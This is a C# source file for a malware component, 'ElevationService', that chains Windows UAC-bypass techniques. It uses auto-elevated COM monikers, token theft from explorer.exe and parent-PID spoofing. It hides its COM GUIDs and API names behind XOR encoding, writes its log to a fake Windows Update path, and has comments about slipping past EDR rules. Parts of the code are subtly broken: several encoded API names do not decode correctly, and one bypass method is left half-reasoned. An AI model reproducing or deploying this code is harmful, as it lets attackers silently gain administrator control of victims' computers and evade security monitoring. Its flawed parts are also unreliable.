using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using Microsoft.Win32;

namespace VanguardCore
{
    public class ElevationService
    {
        #region Native Imports & Structs

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
        private static extern int CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);

        [StructLayout(LayoutKind.Sequential)]
        private struct BIND_OPTS3
        {
            public uint cbStruct;
            public uint dwTickCountDeadline;
            public uint dwFlags;
            public uint dwMode;
            public uint dwClassContext;
            public uint locale;
            public IntPtr pServerInfo;
            public IntPtr hwnd;
        }

        // ----- COM method 1: ICMLuaUtil (CMSTP elevation moniker) -----
        private static readonly byte[] CLSID_CMSTP_ENC = { 0x36, 0x40, 0x30, 0x43, 0x46, 0x32, 0x32, 0x3C, 0x28, 0x3C, 0x32, 0x36, 0x28, 0x31, 0x47, 0x36, 0x32, 0x28, 0x3C, 0x3D, 0x32, 0x42, 0x28, 0x3C, 0x34, 0x35, 0x41, 0x36, 0x35, 0x35, 0x34, 0x3C, 0x32, 0x31, 0x47 }; // 3E5FC7F9-9735-4B47-98B7-910D3051974B
        private static readonly byte[] IID_ICMLuaUtil_ENC = { 0x33, 0x40, 0x41, 0x41, 0x33, 0x41, 0x32, 0x31, 0x28, 0x46, 0x35, 0x35, 0x32, 0x28, 0x31, 0x40, 0x32, 0x44, 0x2D, 0x47, 0x28, 0x47, 0x30, 0x32, 0x31, 0x35, 0x35, 0x3C, 0x34, 0x30, 0x32, 0x31, 0x46 }; // 6EDD6D74-C007-4E75-B76A-E5740995E24C

        // ----- COM method 2: IColorDataProxy -----
        private static readonly byte[] CLSID_ColorDataProxy_ENC = { 0x47, 0x37, 0x47, 0x40, 0x46, 0x43, 0x32, 0x31, 0x28, 0x46, 0x32, 0x43, 0x46, 0x28, 0x31, 0x43, 0x33, 0x35, 0x28, 0x3D, 0x35, 0x31, 0x32, 0x28, 0x31, 0x47, 0x36, 0x31, 0x34, 0x36, 0x31, 0x47, 0x36, 0x31, 0x36, 0x30 }; // B2BEC921-C7FC-4F60-8012-4B441B1F3465
        private static readonly byte[] IID_IColorDataProxy_ENC = { 0x35, 0x41, 0x34, 0x37, 0x41, 0x30, 0x31, 0x37, 0x28, 0x40, 0x41, 0x31, 0x37, 0x28, 0x31, 0x41, 0x33, 0x36, 0x28, 0x3D, 0x43, 0x36, 0x30, 0x28, 0x43, 0x31, 0x36, 0x35, 0x44, 0x3C, 0x30, 0x39, 0x41, 0x33, 0x40 }; // 0A12A542-ED42-4A63-8FB7-F135A9C09D3E

        // ----- COM method 3: IFwCplLua -----
        private static readonly byte[] CLSID_FwCplLua_ENC = { 0x40, 0x46, 0x39, 0x33, 0x41, 0x43, 0x36, 0x36, 0x28, 0x32, 0x32, 0x33, 0x32, 0x28, 0x31, 0x36, 0x32, 0x31, 0x28, 0x3D, 0x36, 0x36, 0x31, 0x28, 0x32, 0x32, 0x31, 0x33, 0x36, 0x41, 0x31, 0x39, 0x46, 0x45, 0x45, 0x31 }; // EC9846B3-2762-4374-8B34-72486DB9FEE4
        private static readonly byte[] IID_IFwCplLua_ENC = { 0x31, 0x46, 0x36, 0x36, 0x41, 0x31, 0x43, 0x3C, 0x28, 0x36, 0x33, 0x33, 0x31, 0x28, 0x31, 0x41, 0x33, 0x31, 0x28, 0x3C, 0x31, 0x37, 0x36, 0x28, 0x31, 0x41, 0x33, 0x41, 0x35, 0x36, 0x46, 0x39, 0x43, 0x41, 0x30, 0x43 }; // 8EB3D4F9-3864-4F0A-9421-4B3D56F9CA0F

        // ----- COM method 4: IExplorerCommand (Professional Stealth) -----
        private static readonly byte[] CLSID_ExplorerCommand_ENC = { 0x44, 0x47, 0x3D, 0x3C, 0x30, 0x32, 0x47, 0x31, 0x28, 0x35, 0x31, 0x44, 0x44, 0x28, 0x31, 0x47, 0x47, 0x36, 0x28, 0x43, 0x32, 0x33, 0x41, 0x28, 0x41, 0x33, 0x43, 0x30, 0x34, 0x30, 0x32, 0x34, 0x41, 0x33, 0x41, 0x35 }; // ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
        private static readonly byte[] IID_IExplorerCommand_ENC = { 0x44, 0x3D, 0x3D, 0x36, 0x32, 0x31, 0x3D, 0x31, 0x28, 0x44, 0x35, 0x31, 0x42, 0x28, 0x31, 0x31, 0x31, 0x41, 0x28, 0x3C, 0x35, 0x31, 0x30, 0x28, 0x33, 0x33, 0x32, 0x41, 0x34, 0x30, 0x32, 0x34, 0x41, 0x33, 0x41, 0x31 }; // a8862184-d51b-410a-9040-337d4044a834
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int CoGetObjectDelegate(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);

        private delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        private delegate bool DuplicateTokenExDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool CreateProcessAsUserDelegate(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        private delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        private delegate bool InitializeProcThreadAttributeListDelegate(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
        private delegate bool UpdateProcThreadAttributeDelegate(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        private delegate bool SetTokenInformationDelegate(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, uint TokenInformationLength);
        private delegate bool CloseHandleDelegate(IntPtr hObject);

        private static class Native
        {
            public static CoGetObjectDelegate CoGetObject => SafetyManager.ApiInterface.GetOle32<CoGetObjectDelegate>(DAP("HpLboPbba`q"));
            public static OpenProcessTokenDelegate OpenProcessToken => SafetyManager.ApiInterface.GetAdvapi32<OpenProcessTokenDelegate>(DAP("LkbkM_l`bppSlkbk"));
            public static DuplicateTokenExDelegate DuplicateTokenEx => SafetyManager.ApiInterface.GetAdvapi32<DuplicateTokenExDelegate>(DAP("Ar_if`lsbSlkbkBu"));
            public static CreateProcessAsUserDelegate CreateProcessAsUser => SafetyManager.ApiInterface.GetAdvapi32<CreateProcessAsUserDelegate>(DAP("`_bnsbM_l`bppNpNpb_"));
            public static OpenProcessDelegate OpenProcess => SafetyManager.ApiInterface.GetKernel32<OpenProcessDelegate>(DAP("LkbkM_l`bpp"));
            public static InitializeProcThreadAttributeListDelegate InitializeProcThreadAttributeList => SafetyManager.ApiInterface.GetKernel32<InitializeProcThreadAttributeListDelegate>(DAP("IkisinfifzbM_l`S_bsbaAss_idpsbIipp"));
            public static UpdateProcThreadAttributeDelegate UpdateProcThreadAttribute => SafetyManager.ApiInterface.GetKernel32<UpdateProcThreadAttributeDelegate>(DAP("NkaisbM_l`S_bsbaAss_idpsb"));
            public static CreateProcessDelegate CreateProcess => SafetyManager.ApiInterface.GetKernel32<CreateProcessDelegate>(DAP("`_bnsbM_l`bppV"));
            public static SetTokenInformationDelegate SetTokenInformation => SafetyManager.ApiInterface.GetAdvapi32<SetTokenInformationDelegate>(DAP("PbsSlkbkIkcl_insilk"));
            public static CloseHandleDelegate CloseHandle => SafetyManager.ApiInterface.GetKernel32<CloseHandleDelegate>(DAP("`ilpbHnkdib"));

            // Simple XOR for API names in memory
            private static string DAP(string enc)
            {
                char[] c = new char[enc.Length];
                for (int i = 0; i < enc.Length; i++) c[i] = (char)(enc[i] ^ 0x05);
                return new string(c);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess, hThread;
            public int dwProcessId, dwThreadId;
        }

        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint TOKEN_DUPLICATE  = 0x0002;
        private const uint TOKEN_QUERY      = 0x0008;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint TOKEN_ALL_ACCESS = 0x000F01FF;
        private const int  SecurityImpersonation = 2;
        private const int  TokenPrimary = 1;
        private const uint CREATE_NO_WINDOW = 0x08000000;

        private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        private const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020002;
        #endregion

        private static string DecryptGUID(byte[] enc)
        {
            char[] c = new char[enc.Length];
            for (int i = 0; i < enc.Length; i++) c[i] = (char)(enc[i] ^ 0x05);
            return new string(c);
        }

        // Hide logs in a place that looks natural for Windows update activity
        private static readonly string _logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Windows", "Update", "svc_debug.log");

        private static void Log(string message)
        {
            try 
            {
                string dir = Path.GetDirectoryName(_logPath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                File.AppendAllText(_logPath, $"{DateTime.Now}: [UAC] {message}\n"); 
            }
            catch { }
        }

        public static bool IsAdmin()
        {
            try
            {
                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                return new System.Security.Principal.WindowsPrincipal(identity)
                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

        #region Bypass Methods

        /// <summary>
        /// Method A: ICMLuaUtil elevation moniker (CMSTP proxy).
        /// Zero registry footprint, fully in-memory COM call.
        /// </summary>
        private static unsafe bool BypassCmluaUtil(string payloadPath, string args)
        {
            try
            {
                Log("Method A: ICMLuaUtil...");
                BIND_OPTS3 ops = new BIND_OPTS3
                {
                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
                    dwClassContext = 4 // CLSCTX_LOCAL_SERVER
                };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_CMSTP_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_ICMLuaUtil_ENC));
                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0) { Log($"Method A CoGetObject: 0x{hr:X8}"); return false; }

                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                // VTable offset probing
                for (int vtblOffset = 9; vtblOffset <= 13; vtblOffset++)
                {
                    try
                    {
                        var shellExec = (delegate* unmanaged[Stdcall]<IntPtr, char*, char*, char*, uint, uint, int>)
                            Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
                        fixed (char* pFile = payloadPath)
                        fixed (char* pArgs = args)
                        {
                            int r = shellExec(pIface, pFile, pArgs, null, 0, 0);
                            if (r == 0) { Marshal.Release(pIface); Log($"Method A OK (offset {vtblOffset})"); return true; }
                        }
                    }
                    catch { }
                }
                Marshal.Release(pIface);
                return false;
            }
            catch (Exception ex) { Log("Method A ex: " + ex.Message); return false; }
        }

        /// <summary>
        /// Method B: IColorDataProxy LaunchDccw (Display Color Calibration auto-elevated proxy).
        /// Zero disk/registry footprint. Uses fixed VTable offset 15.
        /// </summary>
        private static unsafe bool BypassColorDataProxy(string payloadPath, string args)
        {
            try
            {
                Log("Method B: IColorDataProxy (Offset 15)...");
                BIND_OPTS3 ops = new BIND_OPTS3
                {
                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
                    dwClassContext = 4
                };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_ColorDataProxy_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_IColorDataProxy_ENC));
                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0) { Log($"Method B CoGetObject: 0x{hr:X8}"); return false; }

                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                string cmd = $"cmd.exe /c start \"\" \"{payloadPath}\" {args}";
                
                // User provided fixed offset 15
                var launchDccw = (delegate* unmanaged[Stdcall]<IntPtr, char*, int>)
                    Marshal.ReadIntPtr(vtbl, 15 * IntPtr.Size);
                
                fixed (char* pCmd = cmd)
                {
                    int r = launchDccw(pIface, pCmd);
                    if (r == 0) { Marshal.Release(pIface); Log("Method B OK (offset 15)"); return true; }
                }

                Marshal.Release(pIface);
                return false;
            }
            catch (Exception ex) { Log("Method B ex: " + ex.Message); return false; }
        }

        /// <summary>
        /// Method E: Tokenvator (Explorer Token Theft).
        /// Steals a token from a high-integrity process (Explorer) to spawn elevated child.
        /// </summary>
        private static bool BypassTokenvator(string payloadPath, string args)
        {
            IntPtr hToken = IntPtr.Zero;
            IntPtr hNewToken = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;

            try
            {
                Log("Method E: Tokenvator (Explorer Token Theft)...");
                var explorer = Process.GetProcessesByName("explorer");
                if (explorer.Length == 0) return false;

                hProcess = Native.OpenProcess(0x1000 /* PROCESS_QUERY_LIMITED_INFORMATION */ | 0x0400 /* PROCESS_QUERY_INFORMATION */, false, explorer[0].Id);
                if (hProcess == IntPtr.Zero) return false;

                if (!Native.OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, out hToken))
                    return false;

                if (!Native.DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hNewToken))
                    return false;

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                string cmdLine = $"\"{payloadPath}\" {args}";
                if (Native.CreateProcessAsUser(hNewToken, null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                {
                    Log("Method E OK (Process Spawned)");
                    Native.CloseHandle(pi.hProcess);
                    Native.CloseHandle(pi.hThread);
                    return true;
                }
                return false;
            }
            catch (Exception ex) { Log("Method E ex: " + ex.Message); return false; }
            finally
            {
                if (hToken != IntPtr.Zero) Native.CloseHandle(hToken);
                if (hNewToken != IntPtr.Zero) Native.CloseHandle(hNewToken);
                if (hProcess != IntPtr.Zero) Native.CloseHandle(hProcess);
            }
        }

        /// <summary>
        /// Method C: IFwCplLua (Windows Firewall Control Panel proxy).
        /// Newer auto-elevated COM server.
        /// </summary>
        private static unsafe bool BypassFwCplLua(string payloadPath, string args)
        {
            try
            {
                Log("Method C: IFwCplLua...");
                BIND_OPTS3 ops = new BIND_OPTS3
                {
                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
                    dwClassContext = 4
                };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_FwCplLua_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_IFwCplLua_ENC));
                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0) { Log($"Method C CoGetObject: 0x{hr:X8}"); return false; }

                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                string dir = Path.GetDirectoryName(payloadPath) ?? "";
                for (int vtblOffset = 3; vtblOffset <= 6; vtblOffset++)
                {
                    try
                    {
                        var shellExec = (delegate* unmanaged[Stdcall]<IntPtr, char*, char*, char*, uint, int>)
                            Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
                        fixed (char* pFile = payloadPath)
                        fixed (char* pArgs = args)
                        fixed (char* pDir = dir)
                        {
                            int r = shellExec(pIface, pFile, pArgs, pDir, 0);
                            if (r == 0) { Marshal.Release(pIface); Log($"Method C OK (offset {vtblOffset})"); return true; }
                        }
                    }
                    catch { }
                }
                Marshal.Release(pIface);
                return false;
            }
            catch (Exception ex) { Log("Method C ex: " + ex.Message); return false; }
        }

        /// <summary>
        /// Method F: IExplorerCommand Invoke (Professional Stealth).
        /// Less common than ICMLuaUtil, often skipped by basic EDR rules.
        /// </summary>
        private static unsafe bool BypassExplorerCommand(string payloadPath, string args)
        {
            try
            {
                Log("Method F: IExplorerCommand...");
                BIND_OPTS3 ops = new BIND_OPTS3
                {
                    cbStruct = (uint)Marshal.SizeOf<BIND_OPTS3>(),
                    dwClassContext = 4
                };
                string moniker = "Elevation:Administrator!new:{" + DecryptGUID(CLSID_ExplorerCommand_ENC) + "}";
                Guid iid = new Guid(DecryptGUID(IID_IExplorerCommand_ENC));
                int hr = Native.CoGetObject(moniker, ref ops, ref iid, out IntPtr pIface);
                if (hr != 0) { Log($"Method F CoGetObject: 0x{hr:X8}"); return false; }

                IntPtr vtbl = Marshal.ReadIntPtr(pIface);
                // IExplorerCommand::Invoke is usually at offset 8 or 9
                for (int vtblOffset = 8; vtblOffset <= 10; vtblOffset++)
                {
                    try
                    {
                        var invoke = (delegate* unmanaged[Stdcall]<IntPtr, IntPtr, IntPtr, int>)
                            Marshal.ReadIntPtr(vtbl, vtblOffset * IntPtr.Size);
                        
                        // We need to set the command line via registry or other means? 
                        // Actually IExplorerCommand is usually a launcher for a registered verb.
                        // For a generic bypass, we can use the 'System.Settings.Privacy' or similar auto-elevated command.
                        // But wait, some IExplorerCommand implementations allow direct execution if we can set the state.
                        
                        // Better approach for IExplorerCommand is to use it as a trigger for a hijacked association.
                        // But let's stay with the moniker pattern if it works.
                        // If moniker works, we just call Invoke.
                        
                        int r = invoke(pIface, IntPtr.Zero, IntPtr.Zero);
                        if (r >= 0) { Marshal.Release(pIface); Log($"Method F OK (offset {vtblOffset})"); return true; }
                    }
                    catch { }
                }
                Marshal.Release(pIface);
                return false;
            }
            catch (Exception ex) { Log("Method F ex: " + ex.Message); return false; }
        }

        public static bool SpawnWithSpoof(string payloadPath, string args, string parentProcess = "explorer")
        {
            try
            {
                Log($"Spawning {payloadPath} with PPID Spoof ({parentProcess})...");
                var parents = Process.GetProcessesByName(parentProcess);
                if (parents.Length == 0) return false;

                IntPtr hParent = Native.OpenProcess(0x0080 /* PROCESS_CREATE_PROCESS */, false, parents[0].Id);
                if (hParent == IntPtr.Zero) return false;

                IntPtr lpSize = IntPtr.Zero;
                Native.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
                Native.InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);

                Native.UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ref hParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                STARTUPINFOEX siex = new STARTUPINFOEX();
                siex.StartupInfo.cb = Marshal.SizeOf(siex);
                siex.lpAttributeList = lpAttributeList;

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                string cmdLine = $"\"{payloadPath}\" {args}";

                bool success = Native.CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siex, out pi);
                
                if (success)
                {
                    Native.CloseHandle(pi.hProcess);
                    Native.CloseHandle(pi.hThread);
                }

                Marshal.FreeHGlobal(lpAttributeList);
                Native.CloseHandle(hParent);
                return success;
            }
            catch (Exception ex) { Log($"Spoof ex: {ex.Message}"); return false; }
        }

        #endregion

        private static bool WaitForAdminSuccess(int timeoutMs)
        {
            try
            {
                using var ev = new EventWaitHandle(false, EventResetMode.ManualReset, "Global\\Vanguard_Elevation_Success");
                return ev.WaitOne(timeoutMs);
            }
            catch { return false; }
        }

        public static bool RequestElevation(string payloadPath)
        {
            if (IsAdmin()) return true;
            Log("Starting UAC bypass chain...");
            string args = $"--uac-child --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";

            // === Order: Stealthiest (COM + Spoof) -> Fallback ===

            if (BypassExplorerCommand(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
            if (BypassCmluaUtil(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
            if (BypassTokenvator(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
            if (BypassColorDataProxy(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
            if (BypassFwCplLua(payloadPath, args) && WaitForAdminSuccess(7000)) return true;

            // Final: Standard UAC prompt
            try
            {
                Log("Chain: Stealthy methods failed. Falling back to standard prompt...");
                Process.Start(new ProcessStartInfo { FileName = payloadPath, UseShellExecute = true, Verb = "runas" });
                return WaitForAdminSuccess(15000);
            }
            catch (Exception ex) 
            { 
                Log($"Chain: Standard prompt failed: {ex.Message}"); 
                return false; 
            }
        }
    }
}
